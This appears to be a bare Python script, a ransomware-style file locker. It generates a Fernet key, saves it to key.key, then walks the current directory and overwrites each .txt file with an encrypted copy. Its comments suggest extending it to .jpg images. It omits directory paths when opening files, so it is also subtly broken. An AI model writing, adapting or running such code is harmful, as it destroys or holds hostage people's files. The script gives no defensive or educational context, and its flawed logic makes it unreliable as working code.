from cryptography.fernet import Fernet
import os 

key=Fernet.generate_key()

with open("key.key","wb") as f:
    f.write(key)

fernet=Fernet(key)

for i in os.walk(os.getcwd()):
    for j in i[2]:
        if str(j).endswith(".txt"): # .jpg
            with open(str(j),"r") as f: # rb
                data=f.read()


            encrypted = fernet.encrypt(data.encode()) # remove .encode()
            with open(str(j),"wb") as f:
                f.write(encrypted)